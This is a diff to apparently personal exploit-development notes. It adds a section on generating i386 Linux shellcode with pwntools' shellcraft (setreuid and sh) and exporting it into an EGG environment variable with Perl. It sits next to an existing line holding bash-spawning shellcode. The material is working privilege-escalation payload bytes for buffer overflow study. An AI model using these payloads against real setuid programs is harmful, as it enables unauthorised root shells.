@@ -37,3 +37,13 @@ int main(){
 ```
 export EGG=$(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
 ```
+## Creating Shellcode with Pwntools
+* we can also use the `pwn` tool from `Pwntools` to create shellcode using the `shellcraft` utility
+* the following command create two shellcode payloads: one for setting the UID of the user, and one that opens the sh shell
+```Bash
+pwn shellcraft i386.linux.setreuid -f d && pwn shellcraft i386.linux.sh -f d
+```
+* we can then use that with Perl to populate the EGG environment variable:
+```Bash
+export EGG=$(perl -e 'print "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"')
+```
